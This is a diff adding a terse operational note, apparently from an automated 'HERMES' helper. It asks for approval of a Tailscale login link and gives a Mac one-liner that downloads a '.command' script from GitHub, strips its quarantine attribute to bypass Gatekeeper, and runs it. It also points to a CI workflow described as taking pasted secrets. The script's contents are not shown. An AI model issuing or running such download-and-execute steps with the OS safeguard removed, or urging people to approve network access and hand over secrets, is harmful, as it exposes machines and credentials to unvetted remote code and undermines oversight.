@@ -1,0 +1,11 @@
+HERMES WAKE tip #176 — AuthURL UNCHANGED
+Approve: https://login.tailscale.com/a/1d0d805013867
+
+Mac ONE-SHOT tip #176:
+curl -fsSL -o ~/Downloads/HERMES-ONE-SHOT-UNBLOCK.command https://github.com/ilike4movies/hermes-mac-land/raw/main/HERMES-ONE-SHOT-UNBLOCK.command && xattr -d com.apple.quarantine ~/Downloads/HERMES-ONE-SHOT-UNBLOCK.command; open ~/Downloads/HERMES-ONE-SHOT-UNBLOCK.command
+
+Path C: NAG opens Raw paste + secrets ≤1/30m (tip#176). ENABLE opens Web UI at START (tip#175).
+Raw: https://github.com/ilike4movies/hermes-mac-land/raw/main/ci/downstream-stall.yml
+Create: https://github.com/ilike4movies/hermes-mac-land/new/main?filename=.github%2Fworkflows%2Fdownstream-stall.yml
+
+Do NOT remint AuthURL.
